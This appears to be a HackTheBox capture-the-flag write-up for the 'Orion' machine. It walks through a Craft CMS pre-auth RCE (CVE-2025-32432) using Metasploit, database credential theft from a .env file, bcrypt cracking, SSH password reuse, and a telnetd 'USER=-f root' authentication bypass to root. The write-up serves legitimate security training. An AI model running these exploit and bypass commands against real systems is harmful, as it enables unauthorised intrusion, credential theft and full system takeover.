# Orion - HackTheBox

Linux machine exposing only SSH and a Craft CMS instance. An unauthenticated
deserialization flaw allows PHP session file injection, which delivers remote code
execution after bypassing CSRF validation. Database credentials in the application
config lead to a crackable user hash, and a telnet daemon bound to loopback accepts an
argument injection that bypasses authentication entirely.

Target: `10.129.95.138` (`orion.htb`)

---

## Reconnaissance

```bash
echo "10.129.95.138 orion.htb" >> /etc/hosts
nmap -sCV 10.129.95.138
```

Two open ports: SSH (22) and HTTP (80, nginx). The HTTP server redirects to `orion.htb`.

Web fuzzing finds `/admin`, which redirects to `/admin/login`:

```bash
ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic
```

The admin login page exposes the CMS version in the footer: Craft CMS 5.6.16, affected
by CVE-2025-32432.

---

## Exploitation

### CVE-2025-32432 - Craft CMS Pre-Auth RCE

CVE-2025-32432 is a pre-authenticated RCE on the `/actions/assets/generate-transform`
endpoint. The endpoint processes JSON through Yii's object configuration system, allowing
arbitrary class instantiation. The primitive is PHP session file injection: a web shell
gets written into a session file, then the deserialization loads that file as PHP.

The endpoint enforces CSRF validation. Burp confirmed what's needed: a visit to
`/admin/login` returns `CraftSessionId`, `CRAFT_CSRF_TOKEN`, and the `csrfTokenValue`
embedded in the response - all three required to pass the check. The Metasploit module
handles the full CSRF bypass and injection chain:

```bash
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS 10.129.95.138
set VHOST orion.htb
run
```

The box blocks outbound connections - a direct reverse shell never arrives. The module
sidesteps this by running the session over the HTTP channel already established by the
exploit, no listener needed.

Meterpreter session as `www-data`.

---

## Post-Exploitation - Application Config to Database

The first file worth reading after landing on a CMS web server is the environment
file. Craft keeps database credentials there in cleartext:

```bash
cat /var/www/html/craft/.env
```

```
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

Database root, straight out of a readable config file.

```bash
mysql -u root -p'SuperSecureCraft123Pass!' craft
```

```sql
SELECT username, email, password FROM users;
```

```
adam@orion.htb : $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

The `$2y$` prefix identifies bcrypt, which is hashcat mode 3200:

```bash
hashcat -m 3200 hash.txt rockyou.txt
```

```
darkangel
```

---

## Lateral Movement - Credential Reuse

The application password works unchanged on the system account:

```bash
ssh adam@10.129.95.138
```

User flag is in `/home/adam/user.txt`.

---

## Privilege Escalation - CVE-2026-24061 (telnetd Auth Bypass)

The external scan showed only two ports. Local enumeration shows a third:

```bash
ss -tulnp
```

```
tcp   LISTEN   0   1   127.0.0.1:23   0.0.0.0:*
```

`telnetd 2.7` from inetutils, bound to loopback only and therefore invisible to any
external scan. It has no relationship whatsoever with Craft CMS: without local
enumeration this vector would never have surfaced.

The daemon passes the `USER` environment variable straight to `login` as an argument.
A value beginning with a dash is parsed as a flag rather than a username, and `login -f`
means "user is already authenticated, skip verification":

```bash
USER="-f root" telnet -a 127.0.0.1
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root flag is in `/root/root.txt`.

---

## Key Takeaways

- When command execution works but no reverse shell connects, the problem is egress
  filtering, not the payload. Check outbound reachability before rewriting the shell
  three times. Exploits that reuse an already established channel are the answer on
  boxes with no outbound.
- Arbitrary file inclusion is not remote code execution by itself. It becomes RCE only
  when paired with a file the attacker can write into. PHP session files are the natural
  pairing here: a request with a PHP payload in a parameter creates a session, and that
  session file lands on disk in a predictable path.
- Application config files are the shortest path from a web shell to real credentials.
  `.env` held database root, the database held the user hash, the hash cracked to a
  password reused on SSH. Three steps, all of them from one readable file.
- `ss -tulnp` belongs in every post-exploitation checklist alongside `sudo -l`,
  SUID and `getcap -r /`. Services bound to `127.0.0.1` are invisible to external
  scans and are frequently the privilege escalation path.
- Any daemon that passes user controlled input as an argument to another program is
  an argument injection candidate. Here `USER` reaches `login` unsanitised, and a
  leading dash turns a username into a flag.

---

## Disclaimer

This box was completed in the controlled, legal environment provided by HackTheBox.
All actions were performed strictly for educational purposes.
